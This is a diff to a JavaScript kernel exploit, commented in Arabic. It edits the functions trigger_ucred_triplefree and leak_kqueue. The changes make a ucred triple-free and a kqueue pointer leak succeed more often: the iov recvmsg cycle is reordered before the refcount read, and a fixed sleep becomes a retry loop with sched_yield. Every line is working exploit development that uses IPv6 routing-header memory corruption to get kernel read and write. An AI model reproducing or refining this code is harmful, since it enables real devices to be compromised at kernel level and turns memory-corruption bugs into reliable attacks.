@@ -1560,20 +1560,23 @@ function trigger_ucred_triplefree() {
     // 9) free واحدة من التوأم
     free_rthdr(ipv6_socks[twins[1]]);
 
-    // 10) انتظار refcount = 1 لكن بدون لوب مجنونة
+    // 10) انتظار refcount = 1 مع ترتيب ثابت لدورة iov
     var count = 0;
     while (count < TRIPLEFREE_REFCOUNT_MAX_WAIT) {
+      // شغّل recvmsg
       trigger_iov_recvmsg();
 
+      // كمّل دورة iov بالكامل
+      write(new BigInt(iov_sock_1), tmp, 1);
+      wait_iov_recvmsg();
+      read(new BigInt(iov_sock_0), tmp, 1);
+
+      // دلوقتي بس نقرأ refcount
       write32(leak_rthdr.add(0x04), 0);
       get_rthdr(ipv6_socks[twins[0]], leak_rthdr, 8);
 
       if (read32(leak_rthdr) === 1)
         break;
-
-      write(new BigInt(iov_sock_1), tmp, 1);
-      wait_iov_recvmsg();
-      read(new BigInt(iov_sock_0), tmp, 1);
 
       count++;
     }
@@ -1650,18 +1653,32 @@ function leak_kqueue() {
 
     // نحرر triplets[1] عشان نستخدمه في التسريب
     free_rthdr(ipv6_socks[triplets[1]]);
-    
-    // توازن إيقاع: ندي الكيرنل نفس ياخده
-    sched_yield();
-    nanosleep_fun(1.5); // كانت 1، خليناها 2 علشان ثبات أعلى
 
-    // محاولة التسريب
-    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x100);
+    // لوب محاولات خفيفة بدل sleep ثابت
+    var inner_tries = 0;
+    var INNER_MAX = 100;
 
-    var magic = read64(magic_add);
-    var fdp   = read64(leak_rthdr.add(0x98));
+    while (inner_tries < INNER_MAX) {
+      // محاولة التسريب
+      get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x100);
 
-    if (magic.eq(magic_val) && !fdp.eq(0)) {
+      var magic = read64(magic_add);
+      var fdp   = read64(leak_rthdr.add(0x98));
+
+      if (magic.eq(magic_val) && !fdp.eq(0)) {
+        // لقينا الـ window الصح
+        break;
+      }
+
+      // ندي الكيرنل نفس صغير جداً
+      sched_yield();
+      inner_tries++;
+    }
+
+    // لو التسريب نجح جوه اللوب الداخلية نكسر اللوب الأساسية
+    var magic_final = read64(magic_add);
+    var fdp_final   = read64(leak_rthdr.add(0x98));
+    if (magic_final.eq(magic_val) && !fdp_final.eq(0)) {
       break;
     }
 
